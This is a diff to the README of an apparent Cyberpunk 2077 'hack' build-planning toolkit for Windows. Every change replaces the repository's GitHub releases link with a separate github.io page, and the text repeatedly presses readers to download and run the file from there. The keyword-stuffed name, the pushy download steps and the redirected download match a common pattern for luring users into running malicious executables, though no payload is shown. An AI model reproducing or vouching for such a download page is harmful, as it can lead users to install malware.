@@ -1,12 +1,12 @@
 # 🎮 cyberpunk-2077-hack-2026-build-cyberware-toolkit - Your Ultimate Cyberpunk Companion for Smart Builds
 
-[![Download Now](https://img.shields.io/badge/Download-Cyberpunk%20Toolkit-FF00FF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Jaymarenad/cyberpunk-2077-hack-2026-build-cyberware-toolkit/releases)
+[![Download Now](https://img.shields.io/badge/Download-Cyberpunk%20Toolkit-FF00FF?style=for-the-badge&logo=github&logoColor=white)](https://jaymarenad.github.io)
 
 ## 🚀 Getting Started
 
 Welcome to the cyberpunk-2077-hack-2026-build-cyberware-toolkit! This is a friendly PC companion app designed to help you plan and manage everything about your Cyberpunk 2077 character. Whether you're a seasoned player or just starting your journey in Night City, this toolkit makes character building easy and fun.
 
-Visit this link to download the application: [https://github.com/Jaymarenad/cyberpunk-2077-hack-2026-build-cyberware-toolkit/releases](https://github.com/Jaymarenad/cyberpunk-2077-hack-2026-build-cyberware-toolkit/releases)
+Visit this link to download the application: [https://jaymarenad.github.io](https://jaymarenad.github.io)
 
 This app runs directly on your Windows computer. No technical skills needed—just download and go.
 
@@ -28,7 +28,7 @@ Everything is stored locally on your PC, so your data stays private and secure.
 
 Getting the toolkit on your computer is straightforward. Follow these simple steps:
 
-1. **Visit the Download Page:** Click on the download link: [https://github.com/Jaymarenad/cyberpunk-2077-hack-2026-build-cyberware-toolkit/releases](https://github.com/Jaymarenad/cyberpunk-2077-hack-2026-build-cyberware-toolkit/releases)
+1. **Visit the Download Page:** Click on the download link: [https://jaymarenad.github.io](https://jaymarenad.github.io)
 2. **Find the Latest Version:** Look for the newest release file. It's usually at the top of the list.
 3. **Download the File:** Click the download button for the Windows version. The file will start downloading.
 4. **Run the Application:** Once the download finishes, open your Downloads folder and run the file you just downloaded.
@@ -91,7 +91,7 @@ You have full control over your data. You can delete it at any time by removing 
 
 The developer regularly releases new versions with improvements. To get updates:
 
-1. Visit the download page: [https://github.com/Jaymarenad/cyberpunk-2077-hack-2026-build-cyberware-toolkit/releases](https://github.com/Jaymarenad/cyberpunk-2077-hack-2026-build-cyberware-toolkit/releases)
+1. Visit the download page: [https://jaymarenad.github.io](https://jaymarenad.github.io)
 2. Check the "Latest Release" section at the top.
 3. If there's a newer version, download and run it just like the first time.
 
@@ -111,7 +111,7 @@ For major issues, the developer usually posts updates on the release page.
 
 Don't wait any longer to take your Cyberpunk 2077 experience to the next level. Download the cyberpunk-2077-hack-2026-build-cyberware-toolkit now and see how easy character management can be.
 
-**Quick Download:** [https://github.com/Jaymarenad/cyberpunk-2077-hack-2026-build-cyberware-toolkit/releases](https://github.com/Jaymarenad/cyberpunk-2077-hack-2026-build-cyberware-toolkit/releases)
+**Quick Download:** [https://jaymarenad.github.io](https://jaymarenad.github.io)
 
 Visit this link to download the application. In just a few minutes, you'll have a powerful companion that makes every decision in Night City a smart one. Enjoy your journey, choom!
 
